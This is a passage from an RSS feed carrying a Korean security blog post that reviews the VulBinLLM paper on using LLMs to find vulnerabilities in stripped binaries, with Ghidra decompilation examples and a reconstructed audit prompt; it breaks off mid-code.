      <comments>https://hackyboiz.github.io/2025/06/18/ogu123/cve-2024-49138/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] LLM Security &amp; Safety Part 2. VulBinLLM Review(KR)</title>
      <link>https://hackyboiz.github.io/2025/06/15/j0ker/llm_part2/kr/</link>
      <guid>https://hackyboiz.github.io/2025/06/15/j0ker/llm_part2/kr/</guid>
      <pubDate>Sun, 15 Jun 2025 11:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;/2025/06/15/j0ker/llm_part2/kr/9xgtc2.jpg&quot; alt=&quot;index_img&quot;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;! &amp;#xBB34;&amp;#xB824; 6</description>
        
      
      
      
      <content:encoded><![CDATA[<p><img src="/2025/06/15/j0ker/llm_part2/kr/9xgtc2.jpg" alt="index_img"></p><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! &#xBB34;&#xB824; 6&#xAC1C;&#xC6D4;&#xB9CC;&#xC5D0; &#xCC3E;&#xC544;&#xC628;&#x2026;. j0ker &#xC785;&#xB2C8;&#xB2E4;! 2025&#xB144; &#xC0C1;&#xBC18;&#xAE30;&#xC5D0; &#xAE00;&#xC774; &#xC5C6;&#xC5C8;&#xB358; &#xC774;&#xC720;&#xB294;&#x2026; &#xB108;&#xBB34; &#xBC14;&#xBE74;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026; &#x314E;&#x314E; &#xBC14;&#xC05C; &#xC640;&#xC911;&#xC5D0;&#xB3C4; LLM &#xAD00;&#xB828; &#xD2B8;&#xB79C;&#xB4DC;&#xB294; &#xD314;&#xB85C;&#xC5C5;&#xC744; &#xC870;&#xAE08;&#xC529; &#xD558;&#xACE0; &#xC788;&#xC5C8;&#xB294;&#xB370;, &#xC810;&#xC810; &#xB354; &#xB9CE;&#xC740; &#xB17C;&#xBB38;&#xACFC; &#xAE30;&#xC220;&#xB4E4;&#xC774; &#xB098;&#xC624;&#xB2C8;&#xAE4C; &#xB530;&#xB77C;&#xAC00;&#xAE30;&#xAC00; &#xBC85;&#xCC39;&#xB2C8;&#xB2E4;&#x2026; &#xC0AC;&#xB78C; &#xC0B4;&#xB824;&#x2026; &#xC77C;&#xC740; &#xC5B8;&#xC81C;&#xD574;&#x2026;</p><p>&#xADF8;&#xB798;&#xC11C; &#xC804;&#xCCB4;&#xC801;&#xC778; &#xD2B8;&#xB79C;&#xB4DC;&#xB97C; &#xC815;&#xB9AC;&#xD558;&#xAE30;&#xBCF4;&#xB2E4;&#xB294; &#xB2F9;&#xBD84;&#xAC04;&#xC740; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC77D;&#xC5C8;&#xB358; &#xAC83;&#xB4E4;&#xC744; &#xC815;&#xB9AC;&#xD574;&#xBCFC;&#xAE4C; &#xD569;&#xB2C8;&#xB2E4;. &#xC624;&#xB298; &#xB2E4;&#xB8F0; &#xB17C;&#xBB38;&#xC740; &#x201C;VulBinLLM: LLM-powered Vulnerability Detection for Stripped Binaries&#x201D; &#xC785;&#xB2C8;&#xB2E4;. LLM&#xC73C;&#xB85C; Stripped Binary &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xB294;&#xB2E4;&#xB294; &#xC18C;&#xB9AC;&#xC778;&#xB370;&#x2026; &#xC774;&#xAC8C; &#xC9C4;&#xC9DC; &#xB41C;&#xB2E4;&#xACE0;? &#xB77C;&#xB294; &#xC0DD;&#xAC01;&#xC73C;&#xB85C; &#xC77D;&#xC5B4;&#xBCF4;&#xAE30; &#xC2DC;&#xC791;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/06/15/j0ker/llm_part2/kr/9xgth1.jpg" alt="image.jpg"></p><blockquote><p>&#xC798;&#xD558;&#xC790;&#x2026;?</p></blockquote><h2 id="1-LLM&#xC744;-&#xD65C;&#xC6A9;&#xD574;-&#xCDE8;&#xC57D;&#xC810;&#xC744;-&#xCC3E;&#xC744;-&#xC218;-&#xC788;&#xC744;&#xAE4C;"><a href="#1-LLM&#xC744;-&#xD65C;&#xC6A9;&#xD574;-&#xCDE8;&#xC57D;&#xC810;&#xC744;-&#xCC3E;&#xC744;-&#xC218;-&#xC788;&#xC744;&#xAE4C;" class="headerlink" title="1. LLM&#xC744; &#xD65C;&#xC6A9;&#xD574; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xC744;&#xAE4C;?"></a>1. LLM&#xC744; &#xD65C;&#xC6A9;&#xD574; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xC744;&#xAE4C;?</h2><p>&#xBA70;&#xCE60; &#xC804; Hackyboiz &#xC624;&#xD508;&#xC138;&#xBBF8;&#xB098;&#xC5D0;&#xC11C; fandu&#xB2D8;&#xC774; &#xBC1C;&#xD45C;&#xD588;&#xB358; &#xC8FC;&#xC81C;&#xC8E0;? &#x201C;&#xC57C;, &#xC774;&#xAC70; &#xC0AC;&#xB78C;&#xC774; &#xC77D;&#xAE30; &#xD798;&#xB4DC;&#xB2C8;&#xAE4C; LLM &#xC2DC;&#xCF1C;&#xBCF4;&#xBA74; &#xC548; &#xB3FC;?&#x201D; &#xB77C;&#xB294; &#xC544;&#xC8FC; &#xB2E8;&#xC21C;&#xD558;&#xC9C0;&#xB9CC; &#xAC15;&#xB825;&#xD55C; &#xC544;&#xC774;&#xB514;&#xC5B4;&#xC8E0;. &#xC791;&#xB144; AIxCC&#xC5D0;&#xC11C; Team Atlanta&#xAC00; SQLite&#xC5D0;&#xC11C; &#xC81C;&#xB85C;&#xB370;&#xC774;&#xB97C; &#xCC3E;&#xC740;&#xC801;&#xB3C4; &#xC788;&#xACE0;, Project0&#xC5D0;&#xC11C;&#xB3C4; &#xCDE8;&#xC57D;&#xC810; &#xCC3E;&#xC558;&#xB2E4;&#xACE0; &#xD558;&#xACE0;&#x2026;  &#xC774;&#xC81C; X&#xC5D0;&#xC11C;&#xB3C4; LLM&#xC744; &#xD65C;&#xC6A9;&#xD574; Linux SMB&#xC5D0;&#xC11C; &#xC81C;&#xB85C;&#xB370;&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xC558;&#xB2E4;&#xB294; &#xAE00;&#xB3C4; &#xB098;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><a href="https://sean.heelan.io/2025/05/22/how-i-used-o3-to-find-cve-2025-37899-a-remote-zeroday-vulnerability-in-the-linux-kernels-smb-implementation/">How I used o3 to find CVE-2025-37899, a remote zeroday vulnerability in the Linux kernel&#x2019;s SMB implementation</a></li></ul><p>&#xC774; &#xAE00;&#xC774; X(&#xAD6C; &#xD2B8;&#xC704;&#xD130;)&#xC5D0;&#xC11C; &#xAF64; &#xC774;&#xC288;&#xAC00; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><img src="/2025/06/15/j0ker/llm_part2/kr/x_1.png" alt="image.png"></p><blockquote><p>&#xC5C4;&#xCCAD;&#xB09C; &#xC88B;&#xC544;&#xC694;&#xC640; &#xB9AC;&#xD2B8;&#xC717;&#xC218;&#x2026;. &#xC6B0;&#xB9AC; &#xD300; &#xACC4;&#xC815;&#xB3C4; &#xB9CE;&#xC774; &#xC0AC;&#xB791;&#xD574;&#xC8FC;&#xC138;&#xC694;&#x2026;! <a href="https://x.com/hackyboiz">@hackyboiz</a></p></blockquote><p>&#xC774;&#xB807;&#xAC8C; LLM&#xC744; &#xD65C;&#xC6A9;&#xD574; &#xC81C;&#xB85C;&#xB370;&#xC774;&#xB97C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xB108;&#xBB34; &#xD655;&#xC2E4;&#xD574; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;. </p><h2 id="2-Stripped-Binary"><a href="#2-Stripped-Binary" class="headerlink" title="2. Stripped Binary"></a>2. Stripped Binary</h2><p> &#xBA3C;&#xC800; &#x2018;Stripped Binary&#x2019;&#xAC00; &#xBB54;&#xC9C0; &#xC54C;&#xC544;&#xC57C;&#xACA0;&#xC8E0;? &#xC6B0;&#xB9AC;&#xAC00; &#xBCF4;&#xD1B5; C&#xB098; C++ &#xCF54;&#xB4DC;&#xB97C; &#xC9DC;&#xC11C; &#xCEF4;&#xD30C;&#xC77C;&#xD558;&#xBA74; &#xC2E4;&#xD589; &#xD30C;&#xC77C;(&#xBC14;&#xC774;&#xB108;&#xB9AC;)&#xC774; &#xBFC5; &#xD558;&#xACE0; &#xB098;&#xC624;&#xC796;&#xC544;&#xC694;? &#xB514;&#xBC84;&#xAE45;&#xD560; &#xB54C;&#xB294; &#xD568;&#xC218; &#xC774;&#xB984;&#xC774;&#xB098; &#xBCC0;&#xC218; &#xC774;&#xB984; &#xAC19;&#xC740; &#xC815;&#xBCF4;(&#xC2EC;&#xBCFC;)&#xAC00; &#xB2E4; &#xB4E4;&#xC5B4;&#xC788;&#xC5B4;&#xC11C; &#xBD84;&#xC11D;&#xD558;&#xAE30;&#xAC00; &#xD3B8;&#xD569;&#xB2C8;&#xB2E4;.<br>&#xADFC;&#xB370; &#xBC30;&#xD3EC;&#xD560; &#xB54C;&#xB294;? &#xC6A9;&#xB7C9;&#xB3C4; &#xC904;&#xC774;&#xACE0;, &#xBB34;&#xC5C7;&#xBCF4;&#xB2E4; &#xC800;&#xD76C; &#xAC19;&#xC740; &#xD574;&#xCEE4;&#xB4E4;&#xC774; &#xBD84;&#xC11D;&#xD558;&#xAE30; &#xC5B4;&#xB835;&#xAC8C; &#xB9CC;&#xB4E4;&#xB824;&#xACE0; &#xC774; &#xC815;&#xBCF4;&#xB4E4;&#xC744; &#xC2F9; &#xB2E4; &#xB0A0;&#xB824;&#xBC84;&#xB9BD;&#xB2C8;&#xB2E4;. &#xC774;&#xAC8C; &#xBC14;&#xB85C; &#x2018;Stripped Binary&#x2019;&#xC5D0;&#xC694;. &#xD568;&#xC218; &#xC774;&#xB984;&#xC740; <code>sub_401000</code> &#xC774;&#xB534; &#xC2DD;&#xC73C;&#xB85C; &#xBC14;&#xB00C;&#xACE0;, &#xBCC0;&#xC218;&#xAC00; &#xBB54;&#xC9C0;&#xB3C4; &#xBAA8;&#xB974;&#xACA0;&#xACE0;&#x2026; &#xC774;&#xAC78; &#xBD84;&#xC11D;&#xD558;&#xB294; &#xAC74; &#xC9C4;&#xC9DC; &#xB054;&#xCC0D;&#xD55C; &#xC77C;&#xC785;&#xB2C8;&#xB2E4;. &#xC2DC;&#xAC04;&#xACFC; &#xB178;&#xB825;&#xC774; &#xC5C4;&#xCCAD;&#xB098;&#xAC8C; &#xAC08;&#xB824;&#xB098;&#xAC00;&#xC8E0;. &#xCC98;&#xC74C; CTF&#xB098; &#xBC84;&#xADF8;&#xD5CC;&#xD305;&#xC744; &#xD560; &#xB54C; &#xC2A4;&#xD2B8;&#xB9BD;&#xB41C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB9CC; &#xBCF4;&#xB2E4;&#xAC00; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xBD84;&#xC11D;&#xD574;&#xC57C; &#xD560; &#xAE30;&#xD68C;&#xAC00; &#xC788;&#xC5C8;&#xB294;&#xB370;, &#xC815;&#xB9D0; &#xC2E0;&#xC138;&#xACC4;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4; &#x314B;&#x314B; &#xC544;&#xB2C8; &#xBD84;&#xC11D;&#xC774; &#xC774;&#xB807;&#xAC8C; &#xC27D;&#xB2E4;&#xACE0;?(&#xADF8;&#xB798;&#xC11C; &#xADF8; &#xB54C;&#xBD80;&#xD130; &#xC624;&#xD508;&#xC18C;&#xC2A4;&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xACE0; &#xC788;&#xB294;&#x2026;)</p><h2 id="3-&#xC554;&#xD2BC;-&#xADF8;&#xB798;&#xC11C;-LLM&#xC73C;&#xB85C;-&#xCDE8;&#xC57D;&#xC810;&#xC744;-&#xC5B4;&#xB5BB;&#xAC8C;-&#xCC3E;&#xACA0;&#xB2E4;&#xB294;&#xAC74;&#xB370;"><a href="#3-&#xC554;&#xD2BC;-&#xADF8;&#xB798;&#xC11C;-LLM&#xC73C;&#xB85C;-&#xCDE8;&#xC57D;&#xC810;&#xC744;-&#xC5B4;&#xB5BB;&#xAC8C;-&#xCC3E;&#xACA0;&#xB2E4;&#xB294;&#xAC74;&#xB370;" class="headerlink" title="3. &#xC554;&#xD2BC; &#xADF8;&#xB798;&#xC11C; LLM&#xC73C;&#xB85C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC5B4;&#xB5BB;&#xAC8C; &#xCC3E;&#xACA0;&#xB2E4;&#xB294;&#xAC74;&#xB370;?"></a>3. &#xC554;&#xD2BC; &#xADF8;&#xB798;&#xC11C; LLM&#xC73C;&#xB85C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC5B4;&#xB5BB;&#xAC8C; &#xCC3E;&#xACA0;&#xB2E4;&#xB294;&#xAC74;&#xB370;?</h2><p>&#xC774; &#xB17C;&#xBB38;&#xC758; &#xD575;&#xC2EC; &#xBAA9;&#xD45C;&#xB294; <strong>LLM&#xC744; &#xC774;&#xC6A9;&#xD574;&#xC11C; Stripped Binary&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xCC3E;&#xC544;&#xB0B4;&#xB294; &#xC2DC;&#xC2A4;&#xD15C;, VulBinLLM&#xC744; &#xB9CC;&#xB4DC;&#xB294; &#xAC83;</strong>&#xC785;&#xB2C8;&#xB2E4;. &#xADFC;&#xB370; &#xADF8;&#xB0E5; &#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xD55C; &#xCF54;&#xB4DC;&#xB97C; &#xBCF5;&#xBD99;&#xD574;&#xC11C; LLM&#xC5D0; &#x201C;&#xC57C;, &#xCDE8;&#xC57D;&#xC810; &#xCC3E;&#xC544;&#xC918;&#x201D; &#xD558;&#xBA74; &#xC798; &#xB420;&#xAE4C;&#xC694;? &#xB124;, &#xAC04;&#xB2E8;&#xD55C; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; &#xB429;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xB354; &#xD06C;&#xACE0; &#xBC29;&#xB300;&#xD55C; &#xC591;&#xC758; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C;&#xB294;? &#xADF8;&#xAC83;&#xB3C4; stripped &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB77C; &#xD568;&#xC218;&#xBA85;, &#xBCC0;&#xC218;&#xBA85;&#xB3C4; &#xC81C;&#xB300;&#xB85C; &#xB418;&#xC5B4; &#xC788;&#xC9C0; &#xC54A;&#xB2E4;&#xBA74;? &#xD5DB;&#xC18C;&#xB9AC;&#xD558;&#xAE30; &#xB531; &#xC88B;&#xC8E0;. &#xC774; &#xB17C;&#xBB38;&#xC758; &#xC9C4;&#xC9DC; &#xAE30;&#xC5EC;&#xC810;&#xC740; &#xBC14;&#xB85C; &#xC774; &#x2018;&#xC5B4;&#xB5BB;&#xAC8C;?&#x2019;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC5D0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB17C;&#xBB38;&#xC5D0;&#xC11C;&#xB294; &#xC774; &#xBB38;&#xC81C;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xCCB4;&#xACC4;&#xC801;&#xC778; &#xAD6C;&#xC870;&#xB97C; &#xC124;&#xACC4;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/06/15/j0ker/llm_part2/kr/figure1.png" alt="image.png"></p><p>&#xADF8;&#xB0E5; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; LLM&#xC5D0; &#xB123;&#xB294; &#xAC8C; &#xC544;&#xB2C8;&#xB77C; <strong>&#xB514;&#xCEF4;&#xD30C;&#xC77C; -&gt; &#xCD5C;&#xC801;&#xD654; -&gt; &#xC7A5;&#xAE30; &#xAE30;&#xC5B5; &#xC0DD;&#xC131; -&gt; LLM &#xBD84;&#xC11D;</strong> &#xC774;&#xB77C;&#xB294; &#xBA85;&#xD655;&#xD55C; &#xD30C;&#xC774;&#xD504;&#xB77C;&#xC778;&#xC744; &#xAD6C;&#xCD95;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD2B9;&#xD788; &#x2018;&#xCD5C;&#xC801;&#xD654;&#x2019;&#xC640; &#x2018;&#xC7A5;&#xAE30; &#xAE30;&#xC5B5;&#x2019; &#xBD80;&#xBD84;&#xC774; &#xC774; &#xC5F0;&#xAD6C;&#xC758; &#xD575;&#xC2EC;&#xC774;&#xB77C;&#xACE0; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="1-&#xB514;&#xCEF4;&#xD30C;&#xC77C;-&#xCD5C;&#xC801;&#xD654;-Decompilation-Optimization-LLM&#xC744;-&#xC704;&#xD55C;-&#xCF54;&#xB4DC;-&#xC815;&#xC81C;"><a href="#1-&#xB514;&#xCEF4;&#xD30C;&#xC77C;-&#xCD5C;&#xC801;&#xD654;-Decompilation-Optimization-LLM&#xC744;-&#xC704;&#xD55C;-&#xCF54;&#xB4DC;-&#xC815;&#xC81C;" class="headerlink" title="1) &#xB514;&#xCEF4;&#xD30C;&#xC77C; &#xCD5C;&#xC801;&#xD654; (Decompilation Optimization): LLM&#xC744; &#xC704;&#xD55C; &#xCF54;&#xB4DC; &#xC815;&#xC81C;"></a>1) &#xB514;&#xCEF4;&#xD30C;&#xC77C; &#xCD5C;&#xC801;&#xD654; (Decompilation Optimization): LLM&#xC744; &#xC704;&#xD55C; &#xCF54;&#xB4DC; &#xC815;&#xC81C;</h3><p>&#xCCAB; &#xBC88;&#xC9F8; &#xD575;&#xC2EC;&#xC740; &#x2018;&#xB514;&#xCEF4;&#xD30C;&#xC77C; &#xCD5C;&#xC801;&#xD654;&#x2019;&#xC785;&#xB2C8;&#xB2E4;. &#xC544;&#xB798; &#xC608;&#xC2DC;&#xB294; &#xC774; &#xACFC;&#xC815;&#xC744; &#xC544;&#xC8FC; &#xBA85;&#xD655;&#xD558;&#xAC8C; &#xBCF4;&#xC5EC;&#xC8FC;&#xB294; &#xC608;&#xC2DC;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xCD5C;&#xC801;&#xD654; &#xC804;(Ghidra):</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">multiplyMatrix</span><span class="hljs-params">(<span class="hljs-keyword">long</span> param_1, <span class="hljs-keyword">long</span> param_2)</span></span><span class="hljs-function"></span>{local_10 = *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);<span class="hljs-keyword">for</span> (*(<span class="hljs-keyword">long</span> *)local_34 = <span class="hljs-number">0</span>; *(<span class="hljs-keyword">long</span> *)local_34 &lt; R1; local_34++) {<span class="hljs-keyword">for</span> (local_30 = <span class="hljs-number">0</span>; local_30 &lt; C2; local_30++) {(auStack_28)[(<span class="hljs-keyword">long</span>)local_34 * C2 + (<span class="hljs-keyword">long</span>)local_30] = <span class="hljs-number">0</span>;<span class="hljs-keyword">for</span> (local_2c = <span class="hljs-number">0</span>; local_2c &lt; R2; local_2c++) {auStack_28[(<span class="hljs-keyword">long</span>)local_34 * C2 + (<span class="hljs-keyword">long</span>)local_30] += *(<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">long</span>)local_2c * <span class="hljs-number">0xc</span> + param_2 + (<span class="hljs-keyword">long</span>)local_30 * <span class="hljs-number">4</span>)* *(<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">long</span>)local_34 * <span class="hljs-number">8</span> + param_1 + (<span class="hljs-keyword">long</span>)local_2c * <span class="hljs-number">4</span>);}}}}</code></pre><p>&#xBCF4;&#xC2DC;&#xB2E4;&#xC2DC;&#xD53C; &#xBCC0;&#xC218; &#xC774;&#xB984;&#xC740; <code>param_1</code>, <code>local_34</code>, <code>R2</code> &#xCC98;&#xB7FC; &#xC758;&#xBBF8;&#xAC00; &#xC5C6;&#xACE0;, &#xC5EC;&#xB7EC; &#xAC1C;&#xC758; &#xB8E8;&#xD504;&#xBB38;&#xC774; &#xC0AC;&#xC6A9;&#xB418;&#xAE34; &#xD558;&#xC9C0;&#xB9CC; &#xC5B4;&#xB5A4; &#xB9E5;&#xB77D;&#xC778;&#xC9C0; &#xBC14;&#xB85C; &#xD30C;&#xC545;&#xD558;&#xAE30; &#xC5B4;&#xB835;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCD5C;&#xC801;&#xD654; &#xD6C4;(VulBinLLM):</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">multiplyMatrix</span><span class="hljs-params">(<span class="hljs-keyword">long</span> input_matrix_1, <span class="hljs-keyword">long</span> input_matrix_2)</span></span><span class="hljs-function"></span>{<span class="hljs-comment">// Initialize a matrix to store the result of matrix multiplication</span><span class="hljs-keyword">int</span> result_matrix[row_1][column_2] = {<span class="hljs-number">0</span>};<span class="hljs-comment">// Iterate over each row and column of the result matrix</span><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> current_row = <span class="hljs-number">0</span>; current_row &lt; row_1; current_row++) {<span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> current_col = <span class="hljs-number">0</span>; current_col &lt; column_2; current_col++) {<span class="hljs-comment">// Perform matrix multiplication by iterating over the shared dimension</span><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> shared_dim = <span class="hljs-number">0</span>; shared_dim &lt; row_2; shared_dim++) {<span class="hljs-comment">// Vulnerability: Potential pointer arithmetic issue if column_1 and row_2 are not properly allocated</span><span class="hljs-comment">// Multiply corresponding elements from the input matrices and accumulate the result</span>result_matrix[current_row][current_col] += *((<span class="hljs-keyword">int</span> *)(input_matrix_2 + shared_dim * <span class="hljs-number">12</span> + current_col * <span class="hljs-number">4</span>)) * *((<span class="hljs-keyword">int</span> *)(input_matrix_1 + current_row * <span class="hljs-number">8</span> + shared_dim * <span class="hljs-number">4</span>));}}}}</code></pre><p>&#xCD5C;&#xC801;&#xD654; &#xD6C4; &#xCF54;&#xB4DC;&#xB294; &#xC644;&#xC804;&#xD788; &#xB2EC;&#xB77C;&#xC9D1;&#xB2C8;&#xB2E4;. local_10&#xB294; result_matrix&#xB85C; &#xB418;&#xACE0; &#xC8FC;&#xC11D;&#xC774; &#xCD94;&#xAC00;&#xB418;&#xBA74;&#xC11C; &#xD568;&#xC218;&#xC758; &#xC804;&#xCCB4;&#xC801;&#xC778; &#xB9E5;&#xB77D;&#xC744; &#xC27D;&#xAC8C; &#xD30C;&#xC545;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xC7A0;&#xC7AC;&#xC801;&#xC778; &#xCDE8;&#xC57D;&#xC810; &#xC815;&#xBCF4;&#xB3C4; &#xC81C;&#xACF5;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><p>&#xC544;&#xC27D;&#xAC8C;&#xB3C4; &#xB17C;&#xBB38;&#xC5D0;&#xC11C;&#xB294; &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC5B4;&#xB5BB;&#xAC8C; &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xB97C; &#xC791;&#xC131;&#xD588;&#xB294;&#xC9C0; &#xC81C;&#xACF5;&#xD588;&#xB294;&#xC9C0;&#xB294; &#xC548; &#xB098;&#xC640;&#xC788;&#xB294;&#xB370;&#xC694;. &#xADF8;&#xB807;&#xB2E4;&#xBA74; &#xC774; &#xACB0;&#xACFC;&#xB97C; &#xB2E4;&#xC2DC; &#xC5ED;&#xC73C;&#xB85C; LLM&#xC5D0;&#xAC8C; &#xC8FC;&#xACE0; &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4; &#xB2EC;&#xB77C;&#xACE0; &#xD55C;&#xB2E4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xB098;&#xC635;&#xB2C8;&#xB2E4;.</p><blockquote><p>You are a <strong>world-class cybersecurity expert specializing in reverse engineering</strong>. Your primary task is to analyze raw C code decompiled by Ghidra from a <strong>stripped binary</strong>. You need to refactor this code to maximize readability and, most importantly, <strong>identify and annotate potential security vulnerabilities</strong> for a security audit.</p><p>The input code will lack original symbols, have generic variable names (e.g., <code>param_1</code>, <code>local_10</code>), and use complex pointer arithmetic. Your job is to semantically reconstruct the original developer&#x2019;s intent and analyze it from a security perspective.</p><p><strong>Follow these steps precisely:</strong></p><ol><li><strong>Semantic Analysis &amp; Renaming:</strong><ul><li>Infer the high-level purpose of the function (e.g., string copy, matrix multiplication, network packet processing).</li><li>Rename the function and its parameters (<code>param_1</code>, <code>param_2</code>, etc.) to reflect their inferred purpose (e.g., <code>multiplyMatrix</code>, <code>input_matrix_1</code>, <code>input_matrix_2</code>).</li><li>Rename local variables (<code>local_...</code>, <code>auStack_...</code>) to descriptive names based on their usage (e.g., <code>result_matrix</code>, <code>current_row</code>, <code>current_col</code>).<br>&gt;</li></ul></li><li><p><strong>Code Refactoring for Readability:</strong></p><ul><li>Convert complex pointer arithmetic into more intuitive array or struct notation. For example, transform <code>*(int *)((long)local_2c * 0xc + param_2 + (long)local_30 * 4)</code> into a clearer form like <code>input_matrix_2[shared_dim][current_col]</code>.</li><li>Reconstruct data structures. If memory access patterns suggest a multi-dimensional array, represent it as such.</li><li>Simplify control flow and logic where possible without changing the functionality.</li></ul></li><li><p><strong>Vulnerability Identification &amp; Annotation:</strong></p><ul><li>Scrutinize the code for common C/C++ vulnerabilities, including but not limited to:<ul><li><strong>Buffer Overflows/Underflows:</strong> Unchecked indexing or pointer arithmetic.</li><li><strong>Integer Overflows/Underflows:</strong> Operations that could lead to wrapping.</li><li><strong>Null Pointer Dereferences:</strong> Use of pointers that could be null.</li><li><strong>Use-After-Free:</strong> Accessing memory after it has been freed.</li><li><strong>Information Leakage:</strong> Exposing sensitive data.</li></ul></li><li>For <strong>each potential vulnerability found</strong>, insert a comment in the line immediately preceding the vulnerable code. The comment must start with <code>// Vulnerability:</code> and provide a concise explanation of the potential risk.</li></ul></li><li><p><strong>Add Explanatory Comments:</strong></p><ul><li>Add a high-level comment at the beginning of the function explaining its overall purpose.</li><li>Add comments to explain complex or non-obvious parts of the algorithm.</li></ul></li></ol><p><strong>Here is an example of the desired transformation:</strong></p><p><strong>[INPUT] Raw Decompiled Code from Ghidra:</strong><br><pre><code class="hljs C">&gt;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">multiplyMatrix</span><span class="hljs-params">(<span class="hljs-keyword">long</span> param_1, <span class="hljs-keyword">long</span> param_2)</span></span><span class="hljs-function">&gt;</span>{local_10 = *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);<span class="hljs-keyword">for</span> (*(<span class="hljs-keyword">long</span> *)local_34 = <span class="hljs-number">0</span>; *(<span class="hljs-keyword">long</span> *)local_34 &lt; R1; local_34++) {<span class="hljs-keyword">for</span> (local_30 = <span class="hljs-number">0</span>; local_30 &lt; C2; local_30++) {(auStack_28)[(<span class="hljs-keyword">long</span>)local_34 * C2 + (<span class="hljs-keyword">long</span>)local_30] = <span class="hljs-number">0</span>;<span class="hljs-keyword">for</span> (local_2c = <span class="hljs-number">0</span>; local_2c &lt; R2; local_2c++) {auStack_28[(<span class="hljs-keyword">long</span>)local_34 * C2 + (<span class="hljs-keyword">long</span>)local_30] += *(<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">long</span>)local_2c * <span class="hljs-number">0xc</span> + param_2 + (<span class="hljs-keyword">long</span>)local_30 * <span class="hljs-number">4</span>)* *(<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">long</span>)local_34 * <span class="hljs-number">8</span> + param_1 + (<span class="hljs-keyword">long</span>)local_2c * <span class="hljs-number">4</span>);}}}&gt;}</code></pre></p><p><strong>[OUTPUT] Optimized Code for Vulnerability Analysis:</strong><br><pre><code class="hljs C">&gt;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">multiplyMatrix</span><span class="hljs-params">(<span class="hljs-keyword">long</span> input_matrix_1, <span class="hljs-keyword">long</span> input_matrix_2)</span></span><span class="hljs-function">&gt;</span>{<span class="hljs-comment">// Initialize a matrix to store the result of matrix multiplication</span><span class="hljs-keyword">int</span> result_matrix[row_1][column_2] = {<span class="hljs-number">0</span>};<span class="hljs-comment">// Iterate over each row and column of the result matrix</span><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> current_row = <span class="hljs-number">0</span>; current_row &lt; row_1; current_row++) {<span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> current_col = <span class="hljs-number">0</span>; current_col &lt; column_2; current_col++) {<span class="hljs-comment">// Perform matrix multiplication by iterating over the shared dimension</span><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> shared_dim = <span class="hljs-number">0</span>; shared_dim &lt; 